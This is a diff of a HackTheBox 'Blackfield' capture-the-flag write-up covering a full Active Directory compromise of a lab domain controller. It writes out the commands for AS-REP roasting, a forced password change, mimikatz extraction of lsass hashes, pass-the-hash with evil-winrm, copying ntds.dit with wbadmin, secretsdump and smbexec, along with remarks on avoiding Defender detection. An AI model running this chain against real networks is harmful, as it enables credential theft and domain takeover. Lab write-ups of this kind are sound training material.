@@ -6,6 +6,8 @@
 
 ### 100.1 Fingerprinting
 
+Here we can everything we could do before the engagement . Usually `passive` but here I'm interact directly with the box because it's `hackTheBox`.
+
 ```sh
 ping -c1 10.10.10.192
 ```
@@ -17,6 +19,11 @@ ping -c1 10.10.10.192
 nxc smb 10.10.10.192
 ```
 ![](images/smb.png)
+
+Nice we have a domain controller! 
+
+> We already knew that, but it's always good practice confirming `intel`with little `experiments`like these right?
+
 
 | IP Address   | NetBIOS | Domain           | OS                                  |
 | ------------ | ------- | ---------------- | ----------------------------------- |
@@ -54,6 +61,9 @@ nslookup -type=any blackfield.local
 
 ### 300.1 Service Enumeration
 
+
+First things first! What resources are provided by the target that we could abuse or exploit ? 
+
 ```sh
 sudo nmap dc01.blackfield.local \
 	-Pn --disable-arp-ping --reason -v \
@@ -62,18 +72,17 @@ sudo nmap dc01.blackfield.local \
 ```
 
 ![](images/services.png)
+> I'm being ridiculously noisy here! this would never fly in real life. 
 
 It looks like the main attack surface will be the `rpc` `ldap` and `smb`protocols.
 
-Also Our clock is about 8 hours off!
-
-We'll need to go back to `resource development`to fix that!
+Also Our clock is off! We'll need to go back to `resource development`to fix that!
 
 ---
 
 ### 200.2 Resource Development : Fixing Clock Skew 
 
-> Will will try to fix our clock automatically if we don't adjust this.
+> If we don't fix our clock we won't be able to authenticate if we compromise an account! 
 
 ```sh
 sudo timedatectl set-ntp false
@@ -95,6 +104,8 @@ sudo timedatectl set-time '2024-12-14 05:37'
 ---
 
 ### 400.1 Null Session Enumeration
+
+> Should I expect finding a situation like this in a real engagement ?
 
 ```sh
 nxc smb -u 'guest' -p '' --shares dc01
@@ -197,6 +208,10 @@ if __name__ == '__main__':
 As you can see we get the same results because it's the same method!
 ![](images/example.png)
 
+Although we have over 300 accounts. Only 4 do not fallow the naming pattern. 
+
+This is common in many companies. Instead of using something like `michell.mayers`they will use a nominal system that will look like `<some arbritrary prefix> `+ `<some random number> `. Is this real security or is this attempt security through obscurity ?
+
 | Interesting Accounts |
 | -------------------- |
 | audit2020            |
@@ -208,18 +223,19 @@ As you can see we get the same results because it's the same method!
 
 This looks really off. 
 
-I've found a bunch of what looks like usernames. But we already know those are not valid account names! 
+I've found a bunch of what looks like usernames. But we already know those are not valid account names!  Maybe they were `valid`at some point ? 
 
 ```sh
 smbclient -U 'john'%'password123'  //dc01/profiles\$
 ```
 ![](images/profiles.png)
 
-For now I cannot make a lot of sense of this share!! 
+For now I cannot make a lot of sense of this share! Let's move on! 
 
 ---
 
 ### 500.2 ASP-REP Roasting
+###### Looking for low-hanging fruits
 
 ```sh
 python3 GetNPUsers.py \
@@ -237,7 +253,7 @@ However it looks like we have one account that does not require `kerberos pre-au
 [asrep_roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)
 ![](images/explanation.png)
 
-The `Authentication Server Response`  or `AS-REP` for shot contains a `TGT`that was encrypted with the users `ntlm`hash. 
+The `Authentication Server Response`  or `AS-REP` for short contains a `TGT`that was encrypted with the users `ntlm`hash. 
 
 So we could brute force to recover the user password! 
 
@@ -258,8 +274,10 @@ Still we cannot access `/forensic`
 
 ---
 
-###### 600.1 Attack Development : Bloodhound
+### 600.1 Attack Development : Bloodhound
 
+
+Let's gather some intel on the  target domain.
 
 ```sh
 bloodhound-python \
@@ -271,7 +289,7 @@ bloodhound-python \
 ```
 ![](images/collector.png)
 
-The account `support@blackfield.local` can change `audit2020@blackfield.local` password.  Because it has the `ForceChangePassword` on the target account.
+The account `support@blackfield.local` can change `audit2020@blackfield.local` password because it has the `ForceChangePassword` on the target account.
 
 ![](images/forcechangepassword.png)
 
@@ -287,16 +305,20 @@ The account `svc_backup`is member of the backup operators group! We could `prive
 
 
 So the plan is:
-	- Change password for user `audit2020`.
-	- Enumerate share `/forensic`for information that leads to the  compromise of `svc_backup`.
-	- Get initial access using `svc_backup`and `evil-winrm`.
-	- leverage the `Backup Operatos`group to `privesc`
+
+ 1. Change password for user `audit2020`.  
+ 2. Enumerate share `/forensic`for information that leads to the  compromise of `svc_backup`.  
+ 3. Get initial access using `svc_backup`and `evil-winrm`.  
+ 4. leverage the `Backup Operatos`group to `privesc`
+
 
 ---
 
 ### 700.1 Horizontal Movement
 ###### Abusing `PasswordForceChange`
 
+
+We can do change the user password using `rpcclient`.
 
 ```sh
 rpcclient -U 'support'%'#00^BlackKnight' dc01
@@ -323,7 +345,7 @@ Nice! it worked just as planned!
 smbclient -U 'audit2020'%'#00^BlackKnight'  //dc01/forensic
 ```
 
-It looks at some point in the past the system was compromised! The analysts generated memory dumps to investigate the event. Including from the `lsass.exe`process.
+It looks at some point in the past the system was compromised! The analysts generated memory dumps to investigate the event. Including from the `lsass.exe`process!
 
 ![](images/memory.png)
 
@@ -348,18 +370,18 @@ smbget -U 'BLACKFIELD/audit2020'%'#00^BlackKnight' \
 
 We need to run `mimikatz.exe`  x64 as administrator to dump the credentials from  the process dump.
 
-```
+```c
 sekurlsa::Minidump lsass.DMP
 ````
 
-```
+```c
 sekurlsa::logonPasswords
 ```
 
 ![](images/minidump.png)
 
 
-Cool we extract two NTLM hashes
+Cool we extracted two NTLM hashes
 
 ```
 svc_backup: 9658d1d1dcd9250115e2205d9f48400d
@@ -377,10 +399,21 @@ nxc winrm -u 'svc_backup' \
 ```
 ![](images/worked.png)
 
+> [!NOTE] About Pass-The-Hash Attacks
+> If we can take over account only knowing it's hash is there anything like encryption really on windows ?  We may not know the password but the effect is the same! we can just reuse the found hash everywhere!  And windows we'll accept it ! how does that work under the hood? 
+
+
+Also we've learned something new from the experience and this [article](https://www.semperis.com/blog/how-to-defend-against-pass-the-hash-attack/). Here they are teaching how to defend but it also teaches us how to avoid detection! Security analysts may dump memory for process often.  So It's all about behavior! At least now we know  that there's no need for uploading tools . We can dump process and or hives and extract those hashes on our system without touching disk. 
+
+https://www.semperis.com/blog/how-to-defend-against-pass-the-hash-attack/
+![](images/fair.png)
+
+If someone sees an `IT Guy` running `procdump`would that be alarming ? 
+
 
 ---
 
-### 900.1 Stealing `NTDS.dit` 
+### 900.1 Stealing  `NTDS.dit`  
 
 First let's get initial access on the domain controller using a `pass-the-hash` technique. 
 
@@ -390,6 +423,7 @@ evil-winrm \
 	-u 'svc_backup@blackfield.local' \
 	-H '9658d1d1dcd9250115e2205d9f48400d'
 ```
+![](images/initial.png)
 
 
 We can check our `access tokens`with `whoami /priv`.
@@ -397,46 +431,83 @@ We can check our `access tokens`with `whoami /priv`.
 ```
 whoami /priv
 ```
+![](images/privs.png)
 
+Cool both `Backup`and `Restore` privileges are available and enabled!
 
 We can leverage our `privs` `SeBackup`and `SeRestore`to steal the database that stores domain credentials `ntds.dit`.
 
-First wen need to create a shadow copy of the `c:\`drive. Because we cannot open the `NTDS.dit`database while it is in use.
+First wen need to create a shadow copy of the `c:\`drive. Because we cannot open the `NTDS.dit`database while it is in use!
 
-- run `diskshadow.exe`
+Well, defender is indeed doing it's thing.
+```powershell
+Get-Process -Name MsMpEng
 ```
-set verbose on
-set metadata C:\Windows\Temp\meta.cab
-set context clientaccessible
-begin backup
-add volume C: alias cdrive
-create
-expose %cdrive% F:
-end backup
-exit
-```
+![](images/defender.png)
 
-Then we need to use `robocopy`to access extract the database.
+It's better if we do not do anything wild here. 
+
+
+https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
+
+`wbadmin` is the backup utility on windows and we are the `backup operators` hehe
+
+So let's use the `native tool`to backup `c:\windows\ntds` then we could just *copy/restore* `ntds.dit` from the backup and use it to dump domain hashes! 
+
+We could've done this slightly better! Even though this won't  trigger `Windows Defender`we still touching disk. Instead I could've create a `smb share`on my `kali`to copy these files directly! 
+
 ```
-robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+wbadmin start backup -quiet -backuptarget:\\dc01\c$\loot  -include:c:\windows\ntd
 ```
+![](images/perfect.png)
+
+Let's list backups
+```
+wbadmin get versions
+```
+![](images/mention.png)
+
+Now we can use our backup to copy `ntds.dit` 
+```
+wbadmin start recovery -quiet -version:12/14/2024-12:50 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\loot -notrestoreacl
+```
+![](images/recovered.png)
 
 Now let's extract the `system`and `sam`hives. 
 ```
 reg save HKLM\SYSTEM system
+```
+```
 reg save HKLM\SAM sam
 ```
+![](images/everything.png)
 
 And now we can use impacket's `secretsdump` to extract the hashes.
 
-```
+```sh
 python3 secretsdump.py -ntds ntds.dit -system system -sam sam LOCAL
 ```
+![](images/dsync.png)
 
 Perfect! Now time to `Pass-The-Hash`.
 
+ We could get a session as the administrator with: 
+```sh
+evil-winrm \
+	-i 'dc01.blackfield.local' \
+	-u 'administrator@blackfield.local' \
+	-H '184fb5e5178480be64824d4cd53b99ee'
 ```
+
+Or escalate to `nt authority\system`  using impacket's `smbexec.py`
+
+```sh
 python3 smbexec.py \
-	-hashes :nt \
-	blackfield.local/administrator@dc01.blackfied.local
+	-hashes :184fb5e5178480be64824d4cd53b99ee \
+	blackfield.local/administrator@dc01.blackfield.local
 ```
+![](images/system.png)
+
+And that's all I hope you guys liked it!!
+
+Happy Hacking!! 
